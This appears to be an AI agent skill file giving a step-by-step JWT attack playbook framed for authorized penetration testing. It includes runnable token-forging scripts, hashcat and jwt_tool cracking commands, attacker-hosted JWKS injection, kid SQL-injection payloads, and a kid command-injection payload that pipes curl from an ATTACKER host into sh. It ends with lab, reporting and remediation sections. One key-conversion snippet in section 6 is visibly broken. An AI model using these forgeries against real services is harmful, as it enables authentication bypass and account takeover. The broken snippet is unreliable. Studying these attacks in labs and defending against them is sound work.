---
name: jwt-attacks
description: JSON Web Token (JWT) security testing - none algorithm attacks, weak HMAC secrets, key confusion, JWK/JWK injection, kid path traversal and SQL injection, claim manipulation for authorized penetration testing.
---

# JSON Web Token (JWT) Attacks

## 1. Overview & JWT Anatomy

A JWT is three base64url-encoded segments joined by dots: `header.payload.signature`.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsInJvbGUiOiJ1c2VyIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk
```

- **Header** — JSON object with `alg` (signing algorithm) and `typ`. Optional key-locator params: `kid`, `jku`, `jwk`, `x5c`, `x5u`, `x5t`.
- **Payload** — JSON claims: registered (`iss`, `sub`, `aud`, `exp`, `nbf`, `iat`, `jti`), public, and private claims (`role`, `admin`, `email`, `price`...).
- **Signature** — `HMAC(header.payload, secret)` for HS*, or `RSA/ECDSA-sign(header.payload, private_key)` for RS*/ES*.

**base64url** = standard base64 with `-` for `+`, `_` for `/`, and `=` padding stripped. Decode manually:

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d 2>/dev/null; echo
# or pad-corrected:
python3 -c "import base64,sys; s=sys.argv[1]; print(base64.urlsafe_b64decode(s+'='*(-len(s)%4)).decode())" eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

**Algorithm families:**

| alg | Type | Key material |
|---|---|---|
| HS256/384/512 | HMAC (symmetric) | shared secret string |
| RS256/384/512 | RSA PKCS#1 v1.5 (asymmetric) | private key signs, public key verifies |
| PS256/384/512 | RSA-PSS | same as RS |
| ES256/384/512 | ECDSA | private key signs, public key verifies |
| `none` | unsigned | none — signature segment empty |

**Header parameters that matter for attacks:**

| Param | Meaning | Attack surface |
|---|---|---|
| `kid` | Key ID — tells verifier which key to use | path traversal, SQLi, command injection, empty-key |
| `jku` | URL pointing to a JWKS (JSON Web Key Set) | SSRF / attacker-hosted key set |
| `jwk` | Embedded public key in the header | embed your own key, sign with its private half |
| `x5c` | X.509 cert chain in header | embed own cert/key |
| `x5u` | URI pointing to an X.509 cert | SSRF / attacker-hosted cert |
| `x5t` / `x5t#S256` | cert thumbprint | key-selection confusion |

## 2. Tooling

**jwt_tool** (https://github.com/ticarpi/jwt_tool) — the primary CLI:

```bash
git clone https://github.com/ticarpi/jwt_tool && cd jwt_tool && pip3 install -r requirements.txt
python3 jwt_tool.py <token>                      # decode + analysis
python3 jwt_tool.py <token> -T                   # tamper mode (interactive claim editor)
python3 jwt_tool.py <token> -I                   # inject claims
python3 jwt_tool.py <token> -X a                 # exploit: alg:none
python3 jwt_tool.py <token> -X k                 # exploit: kid injection (path traversal)
python3 jwt_tool.py <token> -X i -I -hc kid -hv ../../dev/null   # kid -> empty key
python3 jwt_tool.py <token> -X n                 # exploit: jku header injection
python3 jwt_tool.py <token> -X b                 # exploit: jwk header injection (embedded key)
python3 jwt_tool.py <token> -X s -pk my_pub.pem  # exploit: RS256 -> HS256 confusion
python3 jwt_tool.py <token> -X m                 # exploit: mismatched RSA key
python3 jwt_tool.py <token> -C -d <secret>       # crack with a known/custom secret
python3 jwt_tool.py <token> -C -p wordlist.txt   # crack secret from wordlist
python3 jwt_tool.py <token> -S hs256 -p 'secret' # re-sign with a chosen secret
python3 jwt_tool.py <token> -S rs256 -pr priv.pem # re-sign with RSA private key
python3 jwt_tool.py <token> -t http://target/api -rh 'Authorization: Bearer <tok>' -M np  # tamper + send
python3 jwt_tool.py -t https://target/ -rh "Authorization: Bearer \$TOKEN" -M pb  # playbook scan
```

**Other tooling:**

```bash
# jwt-cli (Rust) — quick decode/sign
jwt decode --no-verify "$TOKEN"
jwt encode --secret 'newsecret' --claim role=admin --claim sub=1

# hashcat — HMAC JWT cracking (mode 16500)
hashcat -m 16500 jwt.txt -a 0 rockyou.txt -O
hashcat -m 16500 jwt.txt -a 3 '?d?d?d?d?d?d'          # mask attack
hashcat -m 16500 jwt.txt rockyou.txt -r rules/best64.rule

# john the ripper (needs the token on its own line in a file)
echo "$TOKEN" > jwt.txt
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
john jwt.txt --show

# c-jwt-cracker — fast C bruteforcer for short secrets
git clone https://github.com/brendan-riordan/c_jwt_cracker
./jwtcrack "$TOKEN"                                    # default alphabet brute
./jwtcrack "$TOKEN" -a abcdefghijklmnopqrstuvwxyz0123456789

# Burp Suite: "JWT Editor" extension (PortSwigger BApp Store) — decode, resign,
# generate keys, auto-attack presets. Also "JWT4B" for inline highlighting.
# Online decoders (paste tokens from TEST accounts only): jwt.io, jwtinspector, token.dev
```

## 3. Recognition — Finding JWTs

JWTs are recognizable by the `eyJ` prefix (base64 of `{"`) and two dots.

```http
GET /api/v1/user HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Cookie: session=eyJhbGciOiJSUzI1NiIs...
X-Auth-Token: eyJhbGciOiJIUzI1NiIs...
```

Hunt in: `Authorization: Bearer`, cookies (`session`, `jwt`, `token`, `access_token`), query strings (`?token=`, `?jwt=`), POST bodies, WebSocket auth messages, HTML/localStorage in JS bundles, mobile app traffic.

```bash
# grep a JS bundle or response dump for tokens
grep -oE 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*' app.js responses.txt | sort -u

# decode header+payload without any tooling
python3 - <<'EOF'
import base64, json, sys
tok = sys.argv[1]
for part in tok.split('.')[:2]:
    part += '=' * (-len(part) % 4)
    print(json.dumps(json.loads(base64.urlsafe_b64decode(part)), indent=2))
EOF
```

Note the `alg`, look for `kid`/`jku`/`jwk`, record `exp`/`iat` and every claim you might want to change. Capture a baseline request that succeeds with the original token before tampering.

## 4. Algorithm None Attack

If the library accepts `alg: none`, the signature is dropped entirely.

```bash
# jwt_tool
python3 jwt_tool.py "$TOKEN" -X a
# then replay the offered token; or craft claims first:
python3 jwt_tool.py "$TOKEN" -X a -I -pc sub -pv admin -pc role -pv administrator

# manual python (no external libs)
python3 - <<'EOF'
import base64, json
def b64(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
hdr = b64({"alg":"none","typ":"JWT"})
pld = b64({"sub":"administrator","role":"admin","exp":9999999999})
print(f"{hdr}.{pld}.")
EOF
```

Replay:

```http
GET /admin HTTP/1.1
Host: target.local
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
```

Variants worth trying when plain `none` is rejected: `None`, `NONE`, `nOnE`, `none ` (trailing space), and a trailing dot with empty signature vs. no trailing dot at all. Some parsers only block the exact lowercase string.

```bash
curl -s -H 'Authorization: Bearer '"$NONE_TOKEN" http://target.local/admin -i | head -5
```

## 5. Weak HMAC Secret Bruteforce

HS256 secrets are often short strings, defaults (`secret`, `key`, `changeme`), or leaked in public repos.

```bash
# hashcat (fastest). Token must be the full JWT on one line.
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
hashcat -m 16500 -a 0 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 16500 -a 6 jwt.txt rockyou.txt '?d?d'          # hybrid wordlist+mask
hashcat -m 16500 jwt.txt --show                            # recovered secret

# john
john --format=HMAC-SHA256 jwt.txt --wordlist=rockyou.txt

# c-jwt-cracker for pure brute of short secrets
./jwtcrack "$TOKEN"

# jwt_tool wordlist crack
python3 jwt_tool.py "$TOKEN" -C -p /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py "$TOKEN" -C -d 'iloveyou'              # single candidate
```

Wordlist tips: rockyou.txt first; then add target-specific words (company name, product names, repo names), default app secrets (`your-256-bit-secret`, `jwt_secret`, `supersecret`), and gitleaks/trufflehog output from the target's public repos. If the secret is recovered, re-sign arbitrary claims:

```bash
python3 jwt_tool.py "$TOKEN" -S hs256 -p 'recovered-secret' -I -pc role -pv admin
curl -s -H "Authorization: Bearer $FORGED" https://target.local/admin
```

## 6. RS256 -> HS256 Key Confusion

If the verifier fetches its public key and feeds it to an HMAC function (some libraries do this when `alg` is attacker-controlled), the HMAC secret becomes the *public key itself* — which is public, so you can forge valid tokens.

```bash
# 1. Obtain the public key (JWKS endpoint, TLS cert, /api/keys, repo leak)
curl -s https://target.local/.well-known/jwks.json | python3 -m json.tool

# 2. Convert JWKS -> PEM public key (n + e are base64url big-endian)
python3 - <<'EOF'
import base64, json, sys, subprocess
jwk = json.load(sys.stdin)['keys'][0]
def i(b): return int.from_bytes(base64.urlsafe_b64decode(b + '=' * (-len(b) % 4)), 'big')
n, e = i(jwk['n']), i(jwk['e'])
def enc(v):
    b = v.to_bytes((v.bit_length() + 7) // 8, 'big')
    return base64.b64encode(b'\x02' + (b'' if b[0] < 0x80 else b'\x00') + b).decode()
der = f"30{enc(bytes.fromhex('02'+enc(n)[2:]))[2:]}"  # build via openssl below instead
print("use openssl route if this looks wrong")
EOF

# Simpler reliable route: extract from the site's TLS cert or any RSA pubkey file
openssl x509 -in cert.pem -pubkey -noout > pubkey.pem
openssl rsa -in pubkey.pem -pubin -outform DER | base64 -w0 > pubkey_b64.txt
# ^ DER bytes of the public key = the HMAC secret to sign with

# 3. Sign with the public key as the HMAC secret
python3 jwt_tool.py "$TOKEN" -X s -pk pubkey.pem        # jwt_tool handles the DER encoding
python3 jwt_tool.py "$TOKEN" -X s -pk pubkey.pem -I -pc username -pv administrator

# 4. Replay
curl -s -H "Authorization: Bearer $FORGED" https://target.local/admin
```

Manual python equivalent:

```python
import hmac, hashlib, base64, json
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
header = b64(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
payload = b64(json.dumps({"sub":"administrator","role":"admin","exp":9999999999}).encode())
pubkey_der = open('pubkey.der','rb').read()   # openssl rsa -pubin -outform DER
sig = b64(hmac.new(pubkey_der, f"{header}.{payload}".encode(), hashlib.sha256).digest())
print(f"{header}.{payload}.{sig}")
```

Signs of success: server accepts the token and honors your claims. If it errors with a signature/key error, the library likely pins the algorithm — move on.

## 7. jku Header Injection

If the verifier reads `jku` from the header and fetches the JWKS from that URL, point it at your own key set.

```bash
# 1. Generate your own RSA pair
openssl genrsa -out attacker_priv.pem 2048
openssl rsa -in attacker_priv.pem -pubout -out attacker_pub.pem

# 2. Build a JWKS from your public key (n/e base64url)
python3 - <<'EOF'
import base64, json
from cryptography.hazmat.primitives import serialization
pub = serialization.load_pem_public_key(open('attacker_pub.pem','rb').read())
n = pub.public_numbers().n; e = pub.public_numbers().e
def u(i): 
    b = i.to_bytes((i.bit_length()+7)//8,'big'); return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
print(json.dumps({"keys":[{"kty":"RSA","use":"sig","alg":"RS256","kid":"attacker-key","n":u(n),"e":u(e)}]}))
EOF

# 3. Host it
python3 -m http.server 8000 &    # serve jwks.json at http://YOUR_IP:8000/jwks.json

# 4. Forge with jku pointing at your JWKS
python3 jwt_tool.py "$TOKEN" -X n -ju http://YOUR_IP:8000/jwks.json -S rs256 -pr attacker_priv.pem
```

Replay and watch your HTTP log for the JWKS fetch (confirms SSRF + acceptance). Chain with SSRF: if the target can only reach internal hosts, host the JWKS on an internal service you control (or use a `file://`/metadata URL if the fetcher is naive). `x5u` behaves the same way with an X.509 cert instead of a JWKS.

## 8. jwk Header Injection

Some libraries verify using the `jwk` embedded in the token header itself — so embed your own key and sign with its private half.

```bash
python3 jwt_tool.py "$TOKEN" -X b            # generates a keypair, embeds jwk, signs
python3 jwt_tool.py "$TOKEN" -X b -I -pc role -pv administrator
```

Manual flow: generate RSA pair, put `{"kty":"RSA","n":...,"e":...,"kid":"x"}` into the header, sign the token with your private key, replay. The server trusts the key that arrived inside the attacker-controlled token — a design flaw even when crypto itself is sound.

## 9. kid Injection

`kid` is often concatenated into a path, SQL query, or shell command by the verifier.

**Path traversal → known empty file:**

```bash
# Point kid at a file whose contents you know; /dev/null is empty -> HMAC key = ""
python3 jwt_tool.py "$TOKEN" -X k -I -hc kid -hv ../../../../dev/null -S hs256 -p ''
# other useful targets: ../../proc/self/environ (leaky), ../../etc/passwd (predictable prefix)
```

Then sign the token with an empty-string secret:

```python
import hmac, hashlib, base64, json
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
h = b64(json.dumps({"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}).encode())
p = b64(json.dumps({"sub":"admin","role":"admin","exp":9999999999}).encode())
sig = b64(hmac.new(b'', f"{h}.{p}".encode(), hashlib.sha256).digest())
print(f"{h}.{p}.{sig}")
```

**SQL injection in kid** — when the verifier does `SELECT key FROM keys WHERE kid = '$kid'`:

```http
{"alg":"HS256","typ":"JWT","kid":"x' UNION SELECT 'attacker-controlled-secret' -- "}
```

Sign the token with `attacker-controlled-secret`. Also try `' OR '1'='1`, `x' UNION SELECT NULL-- `, and error-based payloads to fingerprint the DB.

**Command injection in kid** — rare but real when kid feeds a shell call:

```json
{"kid": "key; curl http://ATTACKER/sh|sh", "alg":"HS256"}
{"kid": "key$(id)", "alg":"HS256"}
```

## 10. Claim Manipulation Without Cracking

When signature forgery fails, attack the *validation logic* instead.

- **Unsigned-part tolerance:** some servers only verify the signature over the payload (or ignore header changes). Re-sign nothing — just swap claims and keep the original signature. Test every claim one at a time.
- **Mixed validators:** services A and B both accept the token but only B checks the signature properly. Forge against the weaker one and replay to the stronger one.
- **Expired token replay:** if `exp` is not enforced server-side (or only checked client-side), old captured tokens still authenticate. Replay a captured token after logout to test revocation.
- **aud/iss validation gaps:** change `aud` to another service's identifier or `iss` to a different issuer and see if the token is still accepted — cross-service token reuse.
- **Role/admin claim tampering:** flip `"role":"user"` → `"role":"admin"`, `"admin":false` → `true`, `"price":1000` → `1`. If the server re-derives authorization from other sources this fails silently; if it trusts the claim, you win.
- **Claim type confusion:** `"role": "admin"` vs `"role": ["admin"]` vs `"role": {"admin": true}` — validators sometimes only check one shape.
- **jti/nbf gaps:** remove `jti` to bypass replay protection; set `nbf` to the past to revive not-yet-valid tokens.

```bash
# systematic tamper-and-replay loop
python3 jwt_tool.py "$TOKEN" -T          # edit claims interactively, get forged tokens
for t in $(cat forged_tokens.txt); do
  curl -s -o /dev/null -w "%{http_code} " -H "Authorization: Bearer $t" https://target.local/admin
done; echo
```

## 11. JWT in Unusual Locations

Tokens don't always live in `Authorization`. Check:

```http
GET /admin?token=eyJhbGciOiJIUzI1NiIs... HTTP/1.1
GET /api/eyJhbGciOiJIUzI1NiIs.../profile HTTP/1.1     # token as a path segment
Cookie: auth=eyJhbGciOiJIUzI1NiIs...
```

- **Cookies:** tokens in cookies may be subject to the same cookie-scoping issues — check for `Secure`/`HttpOnly`/`SameSite` flags and host-file/subdomain takeover exposure.
- **Query strings:** tokens leak via Referer headers, browser history, proxy logs, and server access logs. Flag this in reporting even if the token itself is sound.
- **Path segments:** some frameworks route on the token; try mixing location + tampering (e.g., valid token in header, tampered token in query — which one wins?).
- **Multiple tokens:** send two different tokens (one in cookie, one in header) and observe which identity the server enforces — privilege confusion between validators.

## 12. Lab / Homelab Practice

PortSwigger Web Security Academy — JWT labs (free, browser-based):

1. **JWT-based authentication** — intro lab: encode/decode and tamper basics.
2. **JWT authentication bypass via unsigned JWT** — alg:none.
3. **JWT authentication bypass via flawed signature verification** — accept arbitrary signature.
4. **JWT authentication bypass via weak signing key** — bruteforce the HMAC secret.
5. **JWT authentication bypass via jwk header injection** — embedded-key trust.
6. **JWT authentication bypass via jku header injection** — attacker-hosted JWKS.
7. **JWT authentication bypass via kid header path traversal** — `/dev/null` empty-key trick.

Other practice targets: OWASP crAPI (uses JWTs throughout), DVWA JWT module, HackTheBox/Juice Shop challenges involving tokens. Build a tiny local verifier with `PyJWT` and deliberately misconfigure it (`algorithms=["HS256","RS256","none"]`) to see each attack land.

## 13. Reporting

**Severity mapping:**

| Finding | Typical severity |
|---|---|
| alg:none accepted / signature not verified | Critical |
| Weak HMAC secret cracked | High |
| RS256→HS256 confusion accepted | Critical |
| jku/jwk header injection accepted | Critical |
| kid path traversal / SQLi accepted | High–Critical |
| Role claim tampering honored | High |
| Token not revoked after logout/password change | Medium–High |
| Token in URL/query string (leakage) | Low–Medium |
| Missing exp/aud/iss validation | Medium |

**Evidence to capture:** original token (decoded header+payload), exact forged token, raw HTTP request/response pair showing privileged access with the forged token, tool version + command used, and a screenshot of the admin page/data returned. Always redact real user data and rotate any leaked secrets you report.

**Impact framing:** tie to what the escalated identity can reach — data exfiltration, account takeover of other users, admin panel access, lateral movement.

## 14. Remediation

- **Strong secrets:** ≥256-bit random HMAC secrets (`openssl rand -base64 32`), rotated on schedule, never hardcoded or committed.
- **Algorithm allowlisting:** pin the exact expected algorithm per verifier (`jwt.decode(token, key, algorithms=["RS256"])`). Never derive behavior from the token's own `alg` header.
- **Validate registered claims:** enforce `iss`, `aud`, `exp`, `nbf`, `iat` with small clock-skew tolerance; reject tokens missing any of them.
- **kid sanitization:** allowlist expected kid values server-side; never interpolate kid into paths, SQL, or shell commands.
- **Ignore untrusted header params:** do not fetch keys from `jku`/`x5u` unless the URL is on an allowlisted host; never trust `jwk`/`x5c` embedded in the token.
- **Key management:** separate keys per service/purpose, publish JWKS over HTTPS only, rotate with overlapping validity windows.
- **Revocation:** short token lifetimes + server-side revocation/denylist on logout and password change; consider refresh-token rotation.
- **Transport & storage:** `Secure`, `HttpOnly`, `SameSite` cookies; never place tokens in URLs; avoid localStorage where possible.
- **Library hygiene:** use maintained libraries (PyJWT, jose4j, jsonwebtoken ≥9), keep them patched, and unit-test that malformed/none-alg tokens are rejected.
